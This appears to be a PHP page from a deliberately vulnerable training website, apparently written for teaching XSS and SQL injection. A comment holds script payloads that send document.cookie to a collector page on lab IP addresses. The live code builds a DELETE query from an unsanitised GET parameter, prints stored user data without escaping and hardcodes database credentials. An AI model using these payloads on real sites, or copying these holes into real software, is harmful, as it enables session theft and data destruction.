<?php
/**
 * Created by PhpStorm.
 * User: janjaap
 * Date: 06-12-17
 * Time: 13:30
 */

// Initialize the session.
// If you are using session_name("something"), don't forget it now!
session_start();
/*
// Unset all of the session variables.
$_SESSION = array();

// If it's desired to kill the session, also delete the session cookie.
// Note: This will destroy the session, and not just the session data!
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}

// Finally, destroy the session.
session_destroy();

*/

/*
 * Maak een nieuwe user aan met naam "jantje" en wachtwoord "<script>alert(document.cookie)</script>"
 * Of nog beter:
 * http://192.168.2.15:1212/vulnerable_website/xss/
 *
<script>
var http = new XMLHttpRequest();
http.open(\'GET\', \'http://192.168.161.128/~janjaap/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
http.send(null);
</script>
<script>
var http = new XMLHttpRequest();
http.open(\'GET\', \'http://192.168.2.15:1212/vulnerable_website/xss/add_cookie.php?cookie=\'+ encodeURIComponent(document.cookie),true);
http.send(null);
</script>

 */

$link = mysqli_connect("localhost:3306", "pipo", "declown", "vulnerable_db");

if(isset($_GET['action']) && $_GET['action'] == "delete" && !empty($_GET['id'])) {
    $query = "DELETE FROM user WHERE iduser = ".$_GET['id'];
    mysqli_query($link, $query);
}

$query = "SELECT * FROM user";

$result = mysqli_query($link, $query);
if (!mysqli_query($link, $query)) {
    printf("Errormessage: %s\n", mysqli_error($link));
}

include("../layout/header.php");
include("nav.php");

while($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
    print "<a href=index.php?action=delete&id=".$row[0].">".$row[0]."</a> ".$row[1]." ".$row[2]."<br>";
};

?>

<script>
    //console.log(document.cookie);
</script>
<?php include("../layout/footer.php"); ?>
